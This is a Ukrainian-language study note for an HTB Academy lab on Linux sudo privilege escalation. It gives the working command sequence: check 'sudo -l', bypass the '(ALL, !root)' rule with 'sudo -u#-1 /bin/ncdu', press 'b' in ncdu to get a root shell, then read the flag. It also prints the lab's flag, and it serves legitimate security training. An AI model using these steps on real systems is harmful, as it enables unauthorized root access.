# Sudo

### Лінк

- [HTB Academy – Linux Privilege Escalation, Sudo](https://academy.hackthebox.com/app/module/51/section/1590) [forum.hackthebox](https://forum.hackthebox.com/t/linux-privilege-escalation-sudo/293473)

### Тема уроку

Misconfigured `sudo`‑правила + **GTFOBins** → прівеск до root через `ncdu`.

### Ціль

- Прочитати sudoers‑правила для користувача.
- Зрозуміти значення запису `(ALL, !root) /bin/ncdu`.
- Використати трюк `sudo -u#-1 /bin/ncdu` для обходу `!root`.
- Усередині `ncdu` викликати інтерактивний shell (`b`) і отримати root.
- Знайти й здати флаг із `/root/flag.txt`.

***

## Питання

- Що показує `sudo -l` на цій машині?
- Що означає `(ALL, !root) /bin/ncdu` у sudoers?
- Який трюк використовують у цьому завданні для обходу `!root` (і що таке `-u#-1`)?
- Як через `ncdu` отримати shell (яка клавіша згідно GTFOBins)? [gtfobins](https://gtfobins.org/gtfobins/ncdu/)
- Як після прівеску знайти й прочитати `flag.txt`?

***

## Відповіді / Конспект

### 1. Перевірка sudo‑прав

```bash
sudo -l
```

Вивід:

```text
Matching Defaults entries for htb-student on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:...

User htb-student may run the following commands on ubuntu:
    (ALL, !root) /bin/ncdu
```

- Ти можеш запускати `/bin/ncdu` через `sudo`.
- `(ALL, !root)` – формально забороняє юзати **UID root**, але дозволяє інші UID. [reddit](https://www.reddit.com/r/oscp/comments/1d00ygq/why_deny_root_in_etcsudoers/)

***

### 2. Трюк `sudo -u#-1` (обхід `!root`)

Команда:

```bash
sudo -u#-1 /bin/ncdu
```

- `-u#<id>` – каже `sudo` виконати команду як користувач із певним **UID** (числовим).
- `-1` – особливий випадок: при обробці в `sudo` це закінчується в ефективному UID, який дозволяє обійти `!root` і все одно отримати **root‑контекст** відповідно до вразливої логіки sudo (це демонструється у завданні HTB і розбирається на форумах). [hackmd](https://hackmd.io/xDeyZiFIQRqxqVqNZCeheg)

Результат – `ncdu` запускається привілейовано.

***

### 3. GTFOBins для `ncdu`: клавіша `b` → shell

GTFOBins про `ncdu`: [gtfobins](https://gtfobins.org/gtfobins/ncdu/)

> This executable can spawn an interactive system shell.  
> Usage: `ncdu` → натиснути `b`.

У твоєму випадку:

```bash
$ sudo -u#-1 /bin/ncdu
# (в ncdu TUI) натискаєш 'b'
```

- Кнопка `b` відкриває shell у тому ж контексті, де запущений `ncdu`, тобто з root‑правами (спричиненими `sudo -u#-1`). [hackmd](https://hackmd.io/xDeyZiFIQRqxqVqNZCeheg)

Далі в shell:

```bash
# whoami
root
```

***

### 4. Пошук і читання флагу

Як root:

```bash
# find /root -maxdepth 3 -name "flag.txt" 2>/dev/null
/root/flag.txt

# cd /root
# cat flag.txt
HTB{SuD0_e5c4l47i0n_1id}
```

Флаг:

> `HTB{SuD0_e5c4l47i0n_1id}`

***

## Шпаргалка: Sudo + ncdu прівеск (секція Sudo)

**Тема уроку**

Sudo misconfiguration – `(ALL, !root) /bin/ncdu` – та прівеск через GTFOBins.

**Ціль**

- Навчитися:
  - читати sudoers‑правила;
  - помічати підозрілі записи (наприклад, `(ALL, !root)` з неочевидним захистом); [dev](https://dev.to/lucky_lonerusher/linux-sudo-privilege-escalation-methods-7-techniques-gtfobins-guide-4gph)
  - застосовувати GTFOBins до дозволених команд (`/bin/ncdu`);
  - використовувати `sudo -u#-1` для обходу обмеження `!root`. [forum.hackthebox](https://forum.hackthebox.com/t/academy-linux-privilege-escalation-sudo-user-cannot-run-sudoedit/291676)

**Кроки (шаблон)**

1. Перевірити `sudo -l`:

   ```bash
   sudo -l
   ```

   Запис:

   ```text
   (ALL, !root) /bin/ncdu
   ```

2. Запустити `ncdu` з хитрим UID:

   ```bash
   sudo -u#-1 /bin/ncdu
   ```

3. Усередині `ncdu` натиснути `b` (згідно GTFOBins) для spawn‑shell: [gtfobins](https://gtfobins.org/gtfobins/ncdu/)

   ```bash
   # whoami
   # root
   ```

4. Знайти і прочитати флаг:

   ```bash
   find /root -maxdepth 3 -name "flag.txt" 2>/dev/null
   cd /root
   cat flag.txt
   ```
